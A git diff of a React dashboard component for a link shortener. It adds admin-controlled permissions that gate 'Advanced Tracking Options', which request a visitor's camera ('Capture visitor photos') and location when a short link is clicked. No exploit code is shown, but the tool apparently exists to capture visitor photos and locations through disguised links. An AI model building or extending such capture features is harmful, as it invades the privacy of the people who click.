@@ -18,11 +18,16 @@ import {
 import { FiCopy } from "react-icons/fi";
 
 // ===== CONFIG =====
-const API_BASE_URL = "https://api.cleanpc.xyz";
+const API_BASE_URL = "http://localhost:5000";
 
 const makePublicUrl = (domain, shortCode) => `https://${domain}/${shortCode}`;
 
-const LinkManagement = ({ links, setLinks, onLinkCreated }) => {
+const LinkManagement = ({
+  links,
+  setLinks,
+  onLinkCreated,
+  permissions = {},
+}) => {
   const {
     register,
     handleSubmit,
@@ -48,58 +53,77 @@ const LinkManagement = ({ links, setLinks, onLinkCreated }) => {
   const [editingLink, setEditingLink] = useState(null);
   const [isUpdating, setIsUpdating] = useState(false);
   const [availableDomains, setAvailableDomains] = useState([]);
-  const [cameraPermission, setCameraPermission] = useState(false);
-  const [locationPermission, setLocationPermission] = useState(false);
+  const [userPermissions, setUserPermissions] = useState(permissions);
   const watchShortCode = watch("shortCode");
   const watchEnableCamera = watch("enableCamera");
   const watchEnableLocation = watch("enableLocation");
+  const watchDomain = watch("domain");
+
+  // Update permissions when props change
+  useEffect(() => {
+    setUserPermissions(permissions);
+  }, [permissions]);
 
   // Fetch user data and extract domains
   useEffect(() => {
-    const fetchUserDomains = () => {
+    const fetchUserDomains = async () => {
       try {
-        const userData = localStorage.getItem("user");
-        if (userData) {
-          const user = JSON.parse(userData);
-          const userDomains = user?.domains || [];
+        const token = localStorage.getItem("token");
 
-          // Always include the default domain as fallback
-          const domains =
-            userDomains.length > 0 ? userDomains : ["cleanpc.xyz"];
-          setAvailableDomains(domains);
-
-          // Set the first domain as default in the form
-          if (domains.length > 0) {
-            reset({
-              ...getValues(),
-              domain: domains[0],
-            });
+        // Fetch domains from API
+        const response = await axios.get(
+          `${API_BASE_URL}/api/domains/user/available`,
+          {
+            headers: { Authorization: `Bearer ${token}` },
           }
-        } else {
-          // Fallback if no user data
-          setAvailableDomains(["cleanpc.xyz"]);
+        );
+
+        // The API now returns an array of domain names
+        const domains =
+          response.data.length > 0 ? response.data : ["cleanpc.xyz"];
+        setAvailableDomains(domains);
+
+        if (domains.length > 0) {
           reset({
             ...getValues(),
-            domain: "cleanpc.xyz",
+            domain: domains[0],
           });
         }
       } catch (error) {
         console.error("Error fetching user domains:", error);
-        // Fallback domains
-        setAvailableDomains(["cleanpc.xyz"]);
-        reset({
-          ...getValues(),
-          domain: "cleanpc.xyz",
-        });
       }
     };
 
     fetchUserDomains();
   }, [reset, getValues]);
 
-  // Test permissions when toggles are enabled
+  // Refresh user permissions
+  const refreshUserPermissions = async () => {
+    try {
+      const response = await axios.get(`${API_BASE_URL}/api/auth/profile`, {
+        headers: { Authorization: `Bearer ${localStorage.getItem("token")}` },
+      });
+
+      if (response.data.permissions) {
+        setUserPermissions(response.data.permissions);
+      }
+    } catch (error) {
+      console.error("Failed to refresh permissions:", error);
+    }
+  };
 
   const onSubmit = async (data) => {
+    // Check if user has permission for selected options
+    if (data.enableCamera && !userPermissions?.cameraAccess) {
+      toast.error("Camera access permission has been removed by admin");
+      return;
+    }
+
+    if (data.enableLocation && !userPermissions?.locationAccess) {
+      toast.error("Location access permission has been removed by admin");
+      return;
+    }
+
     setIsLoading(true);
     const toastId = toast.loading("Creating your link...");
 
@@ -218,6 +242,17 @@ const LinkManagement = ({ links, setLinks, onLinkCreated }) => {
   };
 
   const handleEdit = async (data) => {
+    // Check if user has permission for selected options
+    if (data.enableCamera && !userPermissions?.cameraAccess) {
+      toast.error("Camera access permission has been removed by admin");
+      return;
+    }
+
+    if (data.enableLocation && !userPermissions?.locationAccess) {
+      toast.error("Location access permission has been removed by admin");
+      return;
+    }
+
     setIsUpdating(true);
     const toastId = toast.loading("Updating your link...");
 
@@ -274,13 +309,18 @@ const LinkManagement = ({ links, setLinks, onLinkCreated }) => {
     setEditingLink(link);
     setIsCreating(false); // Close create form if open
 
+    // Refresh permissions before editing
+    refreshUserPermissions();
+
     // Pre-fill the form with existing data
     reset({
       domain: link.domain || availableDomains[0],
       shortCode: link.shortCode,
       originalUrl: link.originalUrl,
-      enableCamera: link.enableCamera || false,
-      enableLocation: link.enableLocation || false,
+      enableCamera:
+        link.enableCamera && userPermissions?.cameraAccess ? true : false,
+      enableLocation:
+        link.enableLocation && userPermissions?.locationAccess ? true : false,
     });
   };
 
@@ -298,56 +338,6 @@ const LinkManagement = ({ links, setLinks, onLinkCreated }) => {
   return (
     <div className="min-h-screen bg-gradient-to-br from-gray-50 to-blue-50/30">
       {/* React Hot Toast Container */}
-      <Toaster
-        position="top-right"
-        toastOptions={{
-          duration: 4000,
-          style: {
-            background: "#ffffff",
-            color: "#1f2937",
-            border: "1px solid #e5e7eb",
-            borderRadius: "12px",
-            boxShadow:
-              "0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05)",
-          },
-          success: {
-            duration: 3000,
-            style: {
-              background: "#ffffff",
-              color: "#1f2937",
-              border: "1px solid #10B981",
-            },
-            iconTheme: {
-              primary: "#10B981",
-              secondary: "#ffffff",
-            },
-          },
-          error: {
-            duration: 5000,
-            style: {
-              background: "#ffffff",
-              color: "#1f2937",
-              border: "1px solid #EF4444",
-            },
-            iconTheme: {
-              primary: "#EF4444",
-              secondary: "#ffffff",
-            },
-          },
-          loading: {
-            duration: Infinity,
-            style: {
-              background: "#ffffff",
-              color: "#1f2937",
-              border: "1px solid #3B82F6",
-            },
-            iconTheme: {
-              primary: "#3B82F6",
-              secondary: "#ffffff",
-            },
-          },
-        }}
-      />
 
       <div className="mx-auto">
         {/* Header Section */}
@@ -366,7 +356,7 @@ const LinkManagement = ({ links, setLinks, onLinkCreated }) => {
               setIsCreating(!isCreating);
               setEditingLink(null);
             }}
-            className="group inline-flex items-center justify-center px-6 py-3 border border-transparent text-base font-medium rounded-xl shadow-lg transition-all duration-200 bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-700 hover:to-indigo-700 text-white hover:shadow-xl hover:scale-105 active:scale-95"
+            className="group inline-flex items-center justify-center px-6 py-3 border border-transparent text-base font-medium rounded-xl shadow-lg transition-all duration-200 bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-700 hover:to-indigo-700 text-white hover:shadow-xl "
           >
             <PlusIcon className="w-5 h-5 mr-2 group-hover:rotate-90 transition-transform duration-200" />
             New Link
@@ -477,12 +467,12 @@ const LinkManagement = ({ links, setLinks, onLinkCreated }) => {
                   >
                     <div
                       className="
-                        flex items-center px-4 bg-gray-50 text-gray-600 text-sm font-medium
-                        border-r border-gray-200
-                        select-none
-                      "
+    flex items-center px-4 bg-gray-50 text-gray-600 text-sm font-medium
+    border-r border-gray-200
+    select-none
+  "
                     >
-                      {getValues("domain")}/
+                      {watchDomain || availableDomains[0]}/
                     </div>
                     <input
                       type="text"
@@ -526,80 +516,147 @@ const LinkManagement = ({ links, setLinks, onLinkCreated }) => {
               </div>
 
               {/* Access Permissions Toggles */}
-              <div className="space-y-4">
-                <h3 className="text-lg font-medium text-gray-900 flex items-center">
-                  <ChartBarIcon className="w-5 h-5 mr-2 text-blue-500" />
-                  Advanced Tracking Options
-                </h3>
+              {(userPermissions?.cameraAccess ||
+                userPermissions?.locationAccess) && (
+                <div className="space-y-4">
+                  <h3 className="text-lg font-medium text-gray-900 flex items-center">
+                    <ChartBarIcon className="w-5 h-5 mr-2 text-blue-500" />
+                    Advanced Tracking Options
+                  </h3>
 
-                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
-                  {/* Camera Toggle */}
-                  <div className="flex items-center justify-between p-4 border border-gray-200 rounded-xl bg-white/50">
-                    <div className="flex items-center space-x-3">
-                      <div
-                        className={`p-2 rounded-lg ${
-                          watchEnableCamera
-                            ? "bg-blue-100 text-blue-600"
-                            : "bg-gray-100 text-gray-400"
-                        }`}
-                      >
-                        <CameraIcon className="w-5 h-5" />
+                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                    {/* Camera Toggle - Only show if user has permission */}
+                    {userPermissions?.cameraAccess && (
+                      <div className="flex items-center justify-between p-4 border border-gray-200 rounded-xl bg-white/50">
+                        <div className="flex items-center space-x-3">
+                          <div
+                            className={`p-2 rounded-lg ${
+                              watchEnableCamera && userPermissions?.cameraAccess
+                                ? "bg-blue-100 text-blue-600"
+                                : watchEnableCamera &&
+                                  !userPermissions?.cameraAccess
+                                ? "bg-gray-100 text-gray-400 opacity-50"
+                                : "bg-gray-100 text-gray-400"
+                            }`}
+                          >
+                            <CameraIcon className="w-5 h-5" />
+                          </div>
+                          <div>
+                            <p className="font-medium text-gray-900">
+                              Camera Access
+                              {!userPermissions?.cameraAccess &&
+                                watchEnableCamera && (
+                                  <span className="ml-2 text-xs text-red-600 font-normal">
+                                    (Permission removed by admin)
+                                  </span>
+                                )}
+                            </p>
+                            <p className="text-sm text-gray-500">
+                              {watchEnableCamera
+                                ? "Will request camera when link is clicked"
+                                : "Capture visitor photos"}
+                              {!userPermissions?.cameraAccess &&
+                                watchEnableCamera && (
+                                  <span className="block text-xs text-red-600">
+                                    This feature has been disabled by admin
+                                  </span>
+                                )}
+                            </p>
+                          </div>
+                        </div>
+                        <label className="relative inline-flex items-center cursor-pointer">
+                          <input
+                            type="checkbox"
+                            {...register("enableCamera")}
+                            className="sr-only peer"
+                            disabled={!userPermissions?.cameraAccess}
+                          />
+                          <div
+                            className={`w-11 h-6 ${
+                              !userPermissions?.cameraAccess
+                                ? "bg-gray-300 cursor-not-allowed"
+                                : "bg-gray-200"
+                            } peer-focus:outline-none peer-focus:ring-4 peer-focus:ring-blue-300 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all ${
+                              watchEnableCamera && userPermissions?.cameraAccess
+                                ? "peer-checked:bg-blue-600"
+                                : watchEnableCamera &&
+                                  !userPermissions?.cameraAccess
+                                ? "bg-gray-400"
+                                : ""
+                            }`}
+                          ></div>
+                        </label>
                       </div>
-                      <div>
-                        <p className="font-medium text-gray-900">
-                          Camera Access
-                        </p>
-                        <p className="text-sm text-gray-500">
-                          {watchEnableCamera
-                            ? "Will request camera when link is clicked"
-                            : "Capture visitor photos"}
-                        </p>
-                      </div>
-                    </div>
-                    <label className="relative inline-flex items-center cursor-pointer">
-                      <input
-                        type="checkbox"
-                        {...register("enableCamera")}
-                        className="sr-only peer"
-                      />
-                      <div className="w-11 h-6 bg-gray-200 peer-focus:outline-none peer-focus:ring-4 peer-focus:ring-blue-300 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-blue-600"></div>
-                    </label>
-                  </div>
+                    )}
 
-                  {/* Location Toggle - UPDATED */}
-                  <div className="flex items-center justify-between p-4 border border-gray-200 rounded-xl bg-white/50">
-                    <div className="flex items-center space-x-3">
-                      <div
-                        className={`p-2 rounded-lg ${
-                          watchEnableLocation
-                            ? "bg-blue-100 text-blue-600"
-                            : "bg-gray-100 text-gray-400"
-                        }`}
-                      >
-                        <MapPinIcon className="w-5 h-5" />
+                    {/* Location Toggle - Only show if user has permission */}
+                    {userPermissions?.locationAccess && (
+                      <div className="flex items-center justify-between p-4 border border-gray-200 rounded-xl bg-white/50">
+                        <div className="flex items-center space-x-3">
+                          <div
+                            className={`p-2 rounded-lg ${
+                              watchEnableLocation &&
+                              userPermissions?.locationAccess
+                                ? "bg-blue-100 text-blue-600"
+                                : watchEnableLocation &&
+                                  !userPermissions?.locationAccess
+                                ? "bg-gray-100 text-gray-400 opacity-50"
+                                : "bg-gray-100 text-gray-400"
+                            }`}
+                          >
+                            <MapPinIcon className="w-5 h-5" />
+                          </div>
+                          <div>
+                            <p className="font-medium text-gray-900">
+                              Location Access
+                              {!userPermissions?.locationAccess &&
+                                watchEnableLocation && (
+                                  <span className="ml-2 text-xs text-red-600 font-normal">
+                                    (Permission removed by admin)
+                                  </span>
+                                )}
+                            </p>
+                            <p className="text-sm text-gray-500">
+                              {watchEnableLocation
+                                ? "Will request location when link is clicked"
+                                : "Track visitor location"}
+                              {!userPermissions?.locationAccess &&
+                                watchEnableLocation && (
+                                  <span className="block text-xs text-red-600">
+                                    This feature has been disabled by admin
+                                  </span>
+                                )}
+                            </p>
+                          </div>
+                        </div>
+                        <label className="relative inline-flex items-center cursor-pointer">
+                          <input
+                            type="checkbox"
+                            {...register("enableLocation")}
+                            className="sr-only peer"
+                            disabled={!userPermissions?.locationAccess}
+                          />
+                          <div
+                            className={`w-11 h-6 ${
+                              !userPermissions?.locationAccess
+                                ? "bg-gray-300 cursor-not-allowed"
+                                : "bg-gray-200"
+                            } peer-focus:outline-none peer-focus:ring-4 peer-focus:ring-blue-300 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all ${
+                              watchEnableLocation &&
+                              userPermissions?.locationAccess
+                                ? "peer-checked:bg-blue-600"
+                                : watchEnableLocation &&
+                                  !userPermissions?.locationAccess
+                                ? "bg-gray-400"
+                                : ""
+                            }`}
+                          ></div>
+                        </label>
                       </div>
-                      <div>
-                        <p className="font-medium text-gray-900">
-                          Location Access
-                        </p>
-                        <p className="text-sm text-gray-500">
-                          {watchEnableLocation
-                            ? "Will request location when link is clicked"
-                            : "Track visitor location"}
-                        </p>
-                      </div>
-                    </div>
-                    <label className="relative inline-flex items-center cursor-pointer">
-                      <input
-                        type="checkbox"
-                        {...register("enableLocation")}
-                        className="sr-only peer"
-                      />
-                      <div className="w-11 h-6 bg-gray-200 peer-focus:outline-none peer-focus:ring-4 peer-focus:ring-blue-300 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-blue-600"></div>
-                    </label>
+                    )}
                   </div>
                 </div>
-              </div>
+              )}
 
               {/* Preview */}
               {watchShortCode && !errors.shortCode && (
@@ -608,7 +665,8 @@ const LinkManagement = ({ links, setLinks, onLinkCreated }) => {
                     Preview:
                   </p>
                   <p className="text-blue-700 font-mono text-sm break-all">
-                    https://{getValues("domain")}/{watchShortCode}
+                    https://{watchDomain || availableDomains[0]}/
+                    {watchShortCode}
                   </p>
                 </div>
               )}
@@ -749,7 +807,7 @@ const LinkManagement = ({ links, setLinks, onLinkCreated }) => {
                               </label>
                               <div className="flex items-stretch rounded-xl overflow-hidden shadow-sm border border-gray-300 focus-within:border-gray-600">
                                 <div className="flex items-center px-4 bg-gray-50 text-gray-600 text-sm font-medium border-r border-gray-200 select-none">
-                                  {getValues("domain")}/
+                                  {watchDomain || availableDomains[0]}/
                                 </div>
                                 <input
                                   type="text"
@@ -781,83 +839,156 @@ const LinkManagement = ({ links, setLinks, onLinkCreated }) => {
                             </div>
                           </div>
 
-                          {/* Access Permissions Toggles - ADD THIS SECTION TO EDIT FORM */}
-                          <div className="space-y-4">
-                            <h3 className="text-lg font-medium text-gray-900 flex items-center">
-                              <ChartBarIcon className="w-5 h-5 mr-2 text-blue-500" />
-                              Advanced Tracking Options
-                            </h3>
+                          {/* Access Permissions Toggles - Only show if user has permission */}
+                          {(userPermissions?.cameraAccess ||
+                            userPermissions?.locationAccess) && (
+                            <div className="space-y-4">
+                              <h3 className="text-lg font-medium text-gray-900 flex items-center">
+                                <ChartBarIcon className="w-5 h-5 mr-2 text-blue-500" />
+                                Advanced Tracking Options
+                              </h3>
 
-                            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
-                              {/* Camera Toggle - UPDATED */}
-                              <div className="flex items-center justify-between p-4 border border-gray-200 rounded-xl bg-white/50">
-                                <div className="flex items-center space-x-3">
-                                  <div
-                                    className={`p-2 rounded-lg ${
-                                      watchEnableCamera
-                                        ? "bg-blue-100 text-blue-600"
-                                        : "bg-gray-100 text-gray-400"
-                                    }`}
-                                  >
-                                    <CameraIcon className="w-5 h-5" />
+                              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                                {/* Camera Toggle - Only show if user has permission */}
+                                {userPermissions?.cameraAccess && (
+                                  <div className="flex items-center justify-between p-4 border border-gray-200 rounded-xl bg-white/50">
+                                    <div className="flex items-center space-x-3">
+                                      <div
+                                        className={`p-2 rounded-lg ${
+                                          watchEnableCamera &&
+                                          userPermissions?.cameraAccess
+                                            ? "bg-blue-100 text-blue-600"
+                                            : watchEnableCamera &&
+                                              !userPermissions?.cameraAccess
+                                            ? "bg-gray-100 text-gray-400 opacity-50"
+                                            : "bg-gray-100 text-gray-400"
+                                        }`}
+                                      >
+                                        <CameraIcon className="w-5 h-5" />
+                                      </div>
+                                      <div>
+                                        <p className="font-medium text-gray-900">
+                                          Camera Access
+                                          {!userPermissions?.cameraAccess &&
+                                            watchEnableCamera && (
+                                              <span className="ml-2 text-xs text-red-600 font-normal">
+                                                (Permission removed by admin)
+                                              </span>
+                                            )}
+                                        </p>
+                                        <p className="text-sm text-gray-500">
+                                          {watchEnableCamera
+                                            ? "Will request camera when link is clicked"
+                                            : "Capture visitor photos"}
+                                          {!userPermissions?.cameraAccess &&
+                                            watchEnableCamera && (
+                                              <span className="block text-xs text-red-600">
+                                                This feature has been disabled
+                                                by admin
+                                              </span>
+                                            )}
+                                        </p>
+                                      </div>
+                                    </div>
+                                    <label className="relative inline-flex items-center cursor-pointer">
+                                      <input
+                                        type="checkbox"
+                                        {...register("enableCamera")}
+                                        className="sr-only peer"
+                                        disabled={
+                                          !userPermissions?.cameraAccess
+                                        }
+                                      />
+                                      <div
+                                        className={`w-11 h-6 ${
+                                          !userPermissions?.cameraAccess
+                                            ? "bg-gray-300 cursor-not-allowed"
+                                            : "bg-gray-200"
+                                        } peer-focus:outline-none peer-focus:ring-4 peer-focus:ring-blue-300 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all ${
+                                          watchEnableCamera &&
+                                          userPermissions?.cameraAccess
+                                            ? "peer-checked:bg-blue-600"
+                                            : watchEnableCamera &&
+                                              !userPermissions?.cameraAccess
+                                            ? "bg-gray-400"
+                                            : ""
+                                        }`}
+                                      ></div>
+                                    </label>
                                   </div>
-                                  <div>
-                                    <p className="font-medium text-gray-900">
-                                      Camera Access
-                                    </p>
-                                    <p className="text-sm text-gray-500">
-                                      {watchEnableCamera
-                                        ? "Will request camera when link is clicked"
-                                        : "Capture visitor photos"}
-                                    </p>
-                                  </div>
-                                </div>
-                                <label className="relative inline-flex items-center cursor-pointer">
-                                  <input
-                                    type="checkbox"
-                                    {...register("enableCamera")}
-                                    className="sr-only peer"
-                                  />
-                                  <div className="w-11 h-6 bg-gray-200 peer-focus:outline-none peer-focus:ring-4 peer-focus:ring-blue-300 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-blue-600"></div>
-                                </label>
-                              </div>
+                                )}
 
-                              {/* Location Toggle - UPDATED */}
-                              <div className="flex items-center justify-between p-4 border border-gray-200 rounded-xl bg-white/50">
-                                <div className="flex items-center space-x-3">
-                                  <div
-                                    className={`p-2 rounded-lg ${
-                                      watchEnableLocation
-                                        ? "bg-blue-100 text-blue-600"
-                                        : "bg-gray-100 text-gray-400"
-                                    }`}
-                                  >
-                                    <MapPinIcon className="w-5 h-5" />
+                                {/* Location Toggle - Only show if user has permission */}
+                                {userPermissions?.locationAccess && (
+                                  <div className="flex items-center justify-between p-4 border border-gray-200 rounded-xl bg-white/50">
+                                    <div className="flex items-center space-x-3">
+                                      <div
+                                        className={`p-2 rounded-lg ${
+                                          watchEnableLocation &&
+                                          userPermissions?.locationAccess
+                                            ? "bg-blue-100 text-blue-600"
+                                            : watchEnableLocation &&
+                                              !userPermissions?.locationAccess
+                                            ? "bg-gray-100 text-gray-400 opacity-50"
+                                            : "bg-gray-100 text-gray-400"
+                                        }`}
+                                      >
+                                        <MapPinIcon className="w-5 h-5" />
+                                      </div>
+                                      <div>
+                                        <p className="font-medium text-gray-900">
+                                          Location Access
+                                          {!userPermissions?.locationAccess &&
+                                            watchEnableLocation && (
+                                              <span className="ml-2 text-xs text-red-600 font-normal">
+                                                (Permission removed by admin)
+                                              </span>
+                                            )}
+                                        </p>
+                                        <p className="text-sm text-gray-500">
+                                          {watchEnableLocation
+                                            ? "Will request location when link is clicked"
+                                            : "Track visitor location"}
+                                          {!userPermissions?.locationAccess &&
+                                            watchEnableLocation && (
+                                              <span className="block text-xs text-red-600">
+                                                This feature has been disabled
+                                                by admin
+                                              </span>
+                                            )}
+                                        </p>
+                                      </div>
+                                    </div>
+                                    <label className="relative inline-flex items-center cursor-pointer">
+                                      <input
+                                        type="checkbox"
+                                        {...register("enableLocation")}
+                                        className="sr-only peer"
+                                        disabled={
+                                          !userPermissions?.locationAccess
+                                        }
+                                      />
+                                      <div
+                                        className={`w-11 h-6 ${
+                                          !userPermissions?.locationAccess
+                                            ? "bg-gray-300 cursor-not-allowed"
+                                            : "bg-gray-200"
+                                        } peer-focus:outline-none peer-focus:ring-4 peer-focus:ring-blue-300 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all ${
+                                          watchEnableLocation &&
+                                          userPermissions?.locationAccess
+                                            ? "peer-checked:bg-blue-600"
+                                            : watchEnableLocation &&
+                                              !userPermissions?.locationAccess
+                                            ? "bg-gray-400"
+                                            : ""
+                                        }`}
+                                      ></div>
+                                    </label>
                                   </div>
-                                  <div>
-                                    <p className="font-medium text-gray-900">
-                                      Location Access
-                                    </p>
-                                    <p className="text-sm text-gray-500">
-                                      {watchEnableLocation
-                                        ? "Will request location when link is clicked"
-                                        : "Track visitor location"}
-                                    </p>
-                                  </div>
-                                </div>
-                                <label className="relative inline-flex items-center cursor-pointer">
-                                  <input
-                                    type="checkbox"
-                                    {...register("enableLocation")}
-                                    className="sr-only peer"
-                                  />
-                                  <div className="w-11 h-6 bg-gray-200 peer-focus:outline-none peer-focus:ring-4 peer-focus:ring-blue-300 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-blue-600"></div>
-                                </label>
+                                )}
                               </div>
                             </div>
-
-                            {/* Permissions Status */}
-                          </div>
+                          )}
 
                           {/* Preview */}
                           {watchShortCode && !errors.shortCode && (
@@ -866,7 +997,8 @@ const LinkManagement = ({ links, setLinks, onLinkCreated }) => {
                                 Preview:
                               </p>
                               <p className="text-blue-700 font-mono text-sm break-all">
-                                https://{getValues("domain")}/{watchShortCode}
+                                https://{watchDomain || availableDomains[0]}/
+                                {watchShortCode}
                               </p>
                             </div>
                           )}
@@ -937,15 +1069,37 @@ const LinkManagement = ({ links, setLinks, onLinkCreated }) => {
                                     link.enableLocation) && (
                                     <div className="flex items-center space-x-2">
                                       {link.enableCamera && (
-                                        <span className="flex items-center text-blue-600">
+                                        <span
+                                          className={`flex items-center ${
+                                            userPermissions?.cameraAccess
+                                              ? "text-blue-600"
+                                              : "text-gray-400 line-through"
+                                          }`}
+                                        >
                                           <CameraIcon className="w-3 h-3 mr-1" />
                                           Camera
+                                          {!userPermissions?.cameraAccess && (
+                                            <span className="ml-1 text-xs">
+                                              (Disabled)
+                                            </span>
+                                          )}
                                         </span>
                                       )}
                                       {link.enableLocation && (
-                                        <span className="flex items-center text-green-600">
+                                        <span
+                                          className={`flex items-center ${
+                                            userPermissions?.locationAccess
+                                              ? "text-green-600"
+                                              : "text-gray-400 line-through"
+                                          }`}
+                                        >
                                           <MapPinIcon className="w-3 h-3 mr-1" />
                                           Location
+                                          {!userPermissions?.locationAccess && (
+                                            <span className="ml-1 text-xs">
+                                              (Disabled)
+                                            </span>
+                                          )}
                                         </span>
                                       )}
                                     </div>
